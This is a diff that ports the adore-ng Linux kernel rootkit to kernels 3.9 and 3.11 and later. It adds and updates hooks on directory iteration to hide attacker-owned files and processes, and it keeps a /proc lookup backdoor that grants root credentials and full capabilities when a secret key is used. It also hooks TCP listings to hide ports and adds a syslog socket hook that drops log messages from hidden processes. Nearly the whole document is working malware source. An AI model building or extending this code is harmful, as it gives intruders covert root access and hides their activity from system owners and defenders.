@@ -114,6 +114,13 @@ typedef int (*readdir_t)(struct file *, void *, filldir_t);
 readdir_t orig_root_readdir = NULL, orig_opt_readdir = NULL;
 readdir_t orig_proc_readdir = NULL;
 
+#if (LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0))	
+typedef int (*iterate_dir_t)(struct file *, struct dir_context *);
+iterate_dir_t orig_root_iterate = NULL;
+iterate_dir_t orig_opt_iterate = NULL;
+iterate_dir_t orig_proc_iterate = NULL;
+#endif
+
 struct dentry *(*orig_proc_lookup)(struct inode *, struct dentry *,
                                    struct nameidata *) = NULL;
 
@@ -212,6 +219,12 @@ int should_be_hidden(pid_t pid)
 # define cap_set_full(c)      do { (c) = ((kernel_cap_t){{ ~0, ~0 }}); } while (0)
 #endif
 
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 9, 0))	
+#define PATCH_UID 
+#else
+#define PATCH_UID .val
+#endif
+
 /* You can control adore-ng without ava too:
  *
  * echo > /proc/<ADORE_KEY> will make the shell authenticated,
@@ -226,19 +239,17 @@ struct dentry *adore_lookup(struct inode *i, struct dentry *d,
 	task_lock(current);
 
 	if (strncmp(ADORE_KEY, d->d_iname, strlen(ADORE_KEY)) == 0) {
-		printk("adore--key match ok\n");
 		current->flags |= PF_AUTH;
-		edit_cred->suid = ADORE_VERSION;
+		edit_cred->suid PATCH_UID = ADORE_VERSION;
 	} else if ((current->flags & PF_AUTH) &&
 		   strncmp(d->d_iname, "fullprivs", 9) == 0) {
-		printk("super user\n");
-		edit_cred->uid = 0;
-		edit_cred->suid = 0;
-		edit_cred->euid = 0;
-	    	edit_cred->gid = 0;
-		edit_cred->egid = 0;
-	    	edit_cred->fsuid = 0;
-		edit_cred->fsgid = 0;
+		edit_cred->uid PATCH_UID = 0;
+		edit_cred->suid PATCH_UID = 0;
+		edit_cred->euid PATCH_UID = 0;
+	    edit_cred->gid PATCH_UID = 0;
+		edit_cred->egid PATCH_UID = 0;
+	    edit_cred->fsuid PATCH_UID = 0;
+		edit_cred->fsgid PATCH_UID = 0;
 
 		cap_set_full(edit_cred->cap_effective);
 		cap_set_full(edit_cred->cap_inheritable);
@@ -264,9 +275,7 @@ struct dentry *adore_lookup(struct inode *i, struct dentry *d,
 	return orig_proc_lookup(i, d, nd);
 }
 
-
 filldir_t proc_filldir = NULL;
-//spinlock_t proc_filldir_lock = SPIN_LOCK_UNLOCKED;
 DEFINE_SPINLOCK(proc_filldir_lock);
 
 int adore_proc_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x)
@@ -284,8 +293,6 @@ int adore_proc_filldir(void *buf, const char *name, int nlen, loff_t off, u64 in
 	return 0;
 }
 
-
-
 int adore_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
 {
 	int r = 0;
@@ -299,7 +306,6 @@ int adore_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
 
 
 filldir_t opt_filldir = NULL;
-//struct super_block *opt_sb[1024];
 struct dentry *parent_opt_dir[1024];
 
 int adore_opt_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x)
@@ -311,20 +317,6 @@ int adore_opt_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino
 	int r = 0;
 	uid_t uid;
 	gid_t gid;
-/*
-	if (!opt_sb[current->pid % 1024])
-		return 0;
-
-	// reiserFS workaround
-	reiser = (strcmp(opt_sb[current->pid % 1024]->s_type->name, "reiserfs") == 0);
-	if (reiser) {
-		if ((inode = iget_locked(opt_sb[current->pid % 1024], ino)) == NULL)
-			return 0;
-	} else {
-		if ((inode = iget_locked(opt_sb[current->pid % 1024], ino)) == NULL)
-			return 0;
-	}
-*/
 
 	if (!dir)
 		return 0;
@@ -335,24 +327,21 @@ int adore_opt_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino
 	if (!dentry) {
 		dentry = d_alloc(dir, &this);
 		if (!dentry) {
-			//printk("d_alloc失败%d\n", (int)dentry);
 			return 0;
 		}
-		//printk("%d\n", (int)(dentry->d_inode));
 		if (!dir->d_inode->i_op->lookup)
 			return 0;
 		if(dir->d_inode->i_op->lookup(dir->d_inode, dentry, NULL) != 0) {
-			//printk("lookup错误\n");
 			return 0;
 		}
 	}
 	if(!(inode = dentry->d_inode)) {
-	//printk("inode获取失败\n");
 	return 0;
 	}
-	
-	uid = inode->i_uid;
-	gid = inode->i_gid;
+
+	uid = inode->i_uid PATCH_UID ;
+	gid = inode->i_gid PATCH_UID;
+
 	iput(inode);
 	dput(dentry);
 /*
@@ -420,7 +409,7 @@ int adore_root_filldir(void *buf, const char *name, int nlen, loff_t off, u64 in
 
 	if (!dir)
 		return 0;
-		
+	
 	/* Theres an odd 2.6 behaivior. iget() crashes on ReiserFS! using iget_locked
 	 * without the unlock_new_inode() doesnt crash, but deadlocks
 	 * time to time. So I basically emulate iget() without
@@ -442,10 +431,8 @@ int adore_root_filldir(void *buf, const char *name, int nlen, loff_t off, u64 in
 	
 		dentry = d_alloc(dir, &this);
 		if (!dentry) {
-			//printk("d_alloc失败%d\n", (int)dentry);
 			return 0;
 		}
-		//printk("%d\n", (int)(dentry->d_inode));
 		if (!dir->d_inode->i_op->lookup)
 			return 0;
 		if(dir->d_inode->i_op->lookup(dir->d_inode, dentry, NULL) != 0) {
@@ -454,34 +441,16 @@ int adore_root_filldir(void *buf, const char *name, int nlen, loff_t off, u64 in
 		}
 	}
 	if(!(inode = dentry->d_inode)) {
-	//printk("inode获取失败\n");
-	return 0;
+		return 0;
 	}
 	
-	uid = inode->i_uid;
-	gid = inode->i_gid;
-	//printk("%s: (%d %d)\n", name, uid, gid);
+	uid = inode->i_uid PATCH_UID;
+	gid = inode->i_gid PATCH_UID;
+	printk("%s: (%d %d)\n", name, uid, gid);
 	
 	//iput(inode);
 	//dput(dentry);
-	/*
-	if ((inode = iget_locked(root_sb[current->pid % 1024], ino)) == NULL)
-		return 0;
-		
-	uid = inode->i_uid;
-	gid = inode->i_gid;
 	
-	//printk("%d,%d,%d\n", uid, gid, inode->i_nlink);
-	//printk("文件大小%lld,%d,i节点号%lld\n", inode->i_size, atomic_read(&(inode->i_count)), ino);
-
-	if (inode->i_state & I_NEW) {
-		unlock_new_inode(inode);
-		//printk("%lu\n", (unsigned long)inode);
-		inode->i_state |= I_NEW;
-	}
-
-	iput(inode);
-	*/
 	/* Is it hidden ? */
 	if (uid == ELITE_UID && gid == ELITE_GID) {
 		r = 0;
@@ -506,50 +475,122 @@ int adore_root_readdir(struct file *fp, void *buf, filldir_t filldir)
 	return r;
 }
 
-int patch_vfs(const char *p, readdir_t *orig_readdir, readdir_t new_readdir)
+#if (LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0))
+
+static int adore_opt_iterate(struct file *fp, struct dir_context *ctx)
+{
+	int r = 0;
+	struct dir_context new_ctx = {
+		.actor = adore_proc_filldir
+	};
+	
+	if (!fp || !fp->f_dentry || !orig_opt_iterate)
+		return 0;
+
+	opt_filldir = ctx->actor;
+	memcpy(ctx, &new_ctx, sizeof(readdir_t));
+	parent_opt_dir[current->pid % 1024] = fp->f_dentry;
+	r = orig_opt_iterate(fp, ctx);
+	
+	return r;
+}
+
+static int adore_proc_iterate(struct file *fp, struct dir_context *ctx)
+{
+	int r = 0;
+	struct dir_context new_ctx = {
+		.actor = adore_proc_filldir
+	};
+	
+	spin_lock(&proc_filldir_lock);
+	proc_filldir = ctx->actor;
+	memcpy(ctx, &new_ctx, sizeof(readdir_t));
+	r = orig_proc_iterate(fp, ctx);
+	spin_unlock(&proc_filldir_lock);
+	return r;
+}
+
+static int adore_root_iterate(struct file *fp, struct dir_context *ctx)
+{
+	int r = 0;
+	struct dir_context new_ctx = {
+		.actor = adore_root_filldir
+	};
+	
+	if (!fp || !fp->f_dentry || !orig_root_iterate)
+		return -ENOTDIR;
+	
+	root_filldir = ctx->actor;
+	parent_dir[current->pid % 1024] = fp->f_dentry;
+	
+	memcpy(ctx, &new_ctx, sizeof(readdir_t));
+	r = orig_root_iterate(fp, ctx);
+	
+	return r;
+}
+#endif
+
+int patch_vfs(const char *p, 
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
+			readdir_t *orig_readdir, readdir_t new_readdir
+#else
+			iterate_dir_t *orig_iterate, iterate_dir_t new_iterate
+#endif
+			)
 {
 	struct file_operations *new_op;
 	struct file *filep;
 
 	filep = filp_open(p, O_RDONLY|O_DIRECTORY, 0);
 	if (IS_ERR(filep)) {
-                return -1;
+        return -1;
 	}
-
+	
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
 	if (orig_readdir)
 		*orig_readdir = filep->f_op->readdir;
+#else
+	if (orig_iterate)
+		*orig_iterate = filep->f_op->iterate;
+#endif
 
 	new_op = (struct file_operations *)filep->f_op;
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
 	new_op->readdir = new_readdir;
-	
-	printk("patch starting, old<%x,%x>, new<%x,%x>\n",
-		(unsigned)filep->f_op->readdir,
-		(unsigned)*orig_readdir,
-		(unsigned)(new_op->readdir),
-		(unsigned)new_readdir);
+#else
+	new_op->iterate = new_iterate;
+	printk("patch starting, %x --> %x\n",
+		(unsigned)*orig_iterate,
+		(unsigned)new_iterate);
+#endif
 
 	filep->f_op = new_op;
 	filp_close(filep, 0);
 	return 0;
 }
 
-int unpatch_vfs(const char *p, readdir_t orig_readdir)
+int unpatch_vfs(const char *p, 
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
+				readdir_t orig_readdir
+#else
+				iterate_dir_t orig_iterate
+#endif
+				)
 {
-        struct file_operations *new_op;
+    struct file_operations *new_op;
 	struct file *filep;
 	
-        filep = filp_open(p, O_RDONLY|O_DIRECTORY, 0);
+    filep = filp_open(p, O_RDONLY|O_DIRECTORY, 0);
 	if (IS_ERR(filep)) {
-                return -1;
+        return -1;
 	}
 
-        new_op = (struct file_operations *)filep->f_op;
-        new_op->readdir = orig_readdir;
-
-	printk("unpatch starting, old <%x,%x>, new <%x>\n",
-		(unsigned)filep->f_op->readdir,
-		(unsigned)*orig_readdir,
-		(unsigned)(new_op->readdir));
+	new_op = (struct file_operations *)filep->f_op;
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
+	new_op->readdir = orig_readdir;
+#else
+	new_op->iterate = orig_iterate;
+#endif
 		
 	filp_close(filep, 0);
 	return 0;
@@ -616,6 +657,7 @@ void kobject_unregister(struct kobject * kobj)
 }
 #endif
 
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
 struct proc_dir_entry *proc_find_tcp(void)
 {
 	struct proc_dir_entry *p = init_net.proc_net->subdir;
@@ -624,6 +666,7 @@ struct proc_dir_entry *proc_find_tcp(void)
 		p = p->next;
 	return p;
 }
+#endif
 
 #define NET_CHUNK 150
 
@@ -635,7 +678,6 @@ int adore_tcp4_seq_show(struct seq_file *seq, void *v)
 	char port[12];
 
 	r = orig_tcp4_seq_show(seq, v);
-	printk("*");
 	for (i = 0; HIDDEN_SERVICES[i]; ++i) {
 		sprintf(port, ":%04X", HIDDEN_SERVICES[i]);
 		/* Ignore hidden blocks */
@@ -647,6 +689,92 @@ int adore_tcp4_seq_show(struct seq_file *seq, void *v)
 	
 	return r;
 }
+
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 9, 0))	
+#ifndef UNIXCREDS
+#define UNIXCREDS(skb)	(&UNIXCB((skb)).cred)
+#endif
+
+static
+int (*orig_unix_dgram_recvmsg)(struct kiocb *, struct socket *, struct msghdr *,
+                               size_t, int) = NULL;
+static struct proto_ops *unix_dgram_ops = NULL;
+
+int adore_unix_dgram_recvmsg(struct kiocb *kio, struct socket *sock,
+                             struct msghdr *msg, size_t size, int flags)
+{
+	struct sock *sk = NULL;
+	int noblock = flags & MSG_DONTWAIT;
+	struct sk_buff *skb = NULL;
+	int err;
+	struct ucred *creds = NULL;
+	int not_done = 1;
+
+	if (strncmp(current->comm, "syslog", 6) != 0 || !msg || !sock)
+		goto out;
+
+	sk = sock->sk;
+
+	err = -EOPNOTSUPP;
+	if (flags & MSG_OOB)
+		goto out;
+
+	do {
+		msg->msg_namelen = 0;
+	        skb = skb_recv_datagram(sk, flags|MSG_PEEK, noblock, &err);
+        	if (!skb)
+                	goto out;
+		creds = UNIXCREDS(skb);
+		if (!creds)
+			goto out;
+		if ((not_done = should_be_hidden(creds->pid)))
+			skb_dequeue(&sk->sk_receive_queue);
+	} while (not_done);
+
+out:
+	err = orig_unix_dgram_recvmsg(kio, sock, msg, size, flags);
+        return err;
+}
+
+static int patch_syslog(void)
+{
+	struct socket *sock = NULL;
+#ifdef MODIFY_PAGE_TABLES
+	pgd_t *pgd = NULL;
+	pmd_t *pmd = NULL;
+	pte_t *pte = NULL, new_pte;
+#ifdef FOUR_LEVEL_PAGING
+	pud_t *pud = NULL;
+#endif
+#endif
+
+	/* PF_UNIX, SOCK_DGRAM */
+	if (sock_create(1, 2, 0, &sock) < 0)
+		return -1;
+
+#ifdef MODIFY_PAGE_TABLES
+	pgd = pgd_offset_k((unsigned long)sock->ops);
+#ifdef FOUR_LEVEL_PAGING
+	pud = pud_offset(pgd, (unsigned long)sock->ops);
+	pmd = pmd_offset(pud, (unsigned long)sock->ops);
+#else
+	pmd = pmd_offset(pgd, (unsigned long)sock->ops);
+#endif
+	pte = pte_offset_kernel(pmd, (unsigned long)sock->ops);
+	new_pte = pte_mkwrite(*pte);
+	set_pte(pte, new_pte);
+
+#endif /* Page-table stuff */
+
+	if (sock && (unix_dgram_ops = (struct proto_ops *)sock->ops)) {
+		orig_unix_dgram_recvmsg = unix_dgram_ops->recvmsg;
+		unix_dgram_ops->recvmsg = adore_unix_dgram_recvmsg;
+		sock_release(sock);
+	}
+
+	return 0;
+}
+#endif
 
 int __init adore_init(void)
 {
@@ -672,14 +800,20 @@ int __init adore_init(void)
 	new_inode_op = (struct inode_operations *)filep->f_dentry->d_inode->i_op;
 	orig_proc_lookup = new_inode_op->lookup;
 	new_inode_op->lookup = adore_lookup;
-
+	
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
 	patch_vfs(proc_fs, &orig_proc_readdir, adore_proc_readdir);
 	patch_vfs(root_fs, &orig_root_readdir, adore_root_readdir);
-
 	if (opt_fs)
-		patch_vfs(opt_fs, &orig_opt_readdir,
-		          adore_opt_readdir);
+		patch_vfs(opt_fs, &orig_opt_readdir, adore_opt_readdir);
+#else
+	patch_vfs(proc_fs, &orig_proc_iterate, adore_proc_iterate);
+	patch_vfs(root_fs, &orig_root_iterate, adore_root_iterate);
+	if (opt_fs)
+		patch_vfs(opt_fs, &orig_opt_iterate, adore_opt_iterate);
+#endif
 				  
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
 	pde = proc_find_tcp();
 	t_afinfo = (struct tcp_seq_afinfo*)pde->data;
 	if (t_afinfo) {
@@ -687,6 +821,8 @@ int __init adore_init(void)
 		t_afinfo->seq_ops.show = adore_tcp4_seq_show;
 		printk("patch proc_net: %x --> %x", orig_tcp4_seq_show, adore_tcp4_seq_show);
 	}
+#endif
+	//patch_syslog();
 
 	j = 0;
 	for (i = 0; var_filenames[i]; ++i) {
@@ -696,11 +832,8 @@ int __init adore_init(void)
 			continue;
 		}
 		if (!j) {	/* just replace one time, its all the same FS */
-			orig_var_write = var_files[i]->f_op->write;
-			new_op = (struct file_operations *)var_files[i]->f_op;
-			//new_op->write = adore_var_write;
-		
-			//var_files[i]->f_op->write = adore_var_write;
+			//orig_var_write = var_files[i]->f_op->write;
+			//((struct file_operations *)(var_files[i]->f_op))->write = adore_var_write;
 			j = 1;
 		}
 	}
@@ -735,6 +868,7 @@ void __exit adore_cleanup(void)
 	struct tcp_seq_afinfo *t_afinfo = NULL;
 	struct file *filep;
 	
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
 	pde = proc_find_tcp();
 	t_afinfo = (struct tcp_seq_afinfo*)pde->data;
 	if (t_afinfo && orig_tcp4_seq_show)
@@ -742,6 +876,7 @@ void __exit adore_cleanup(void)
 		printk("unpatch proc_net: %x --> %x", t_afinfo->seq_ops.show, orig_tcp4_seq_show);
 		t_afinfo->seq_ops.show = orig_tcp4_seq_show;
 	}
+#endif
 
 	filep = filp_open(proc_fs, O_RDONLY|O_DIRECTORY, 0);
 	if (IS_ERR(filep)) {
@@ -754,11 +889,17 @@ void __exit adore_cleanup(void)
 	new_inode_op = (struct inode_operations *)filep->f_dentry->d_inode->i_op;
 	new_inode_op->lookup = orig_proc_lookup;
 
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
 	unpatch_vfs(proc_fs, orig_proc_readdir);
 	unpatch_vfs(root_fs, orig_root_readdir);
-
 	if (orig_opt_readdir)
 		unpatch_vfs(opt_fs, orig_opt_readdir);
+#else
+	unpatch_vfs(proc_fs, orig_proc_iterate);
+	unpatch_vfs(root_fs, orig_root_iterate);
+	if (orig_opt_readdir)
+		unpatch_vfs(opt_fs, orig_opt_iterate);
+#endif
 
 	j = 0;
 	for (i = 0; var_filenames[i]; ++i) {
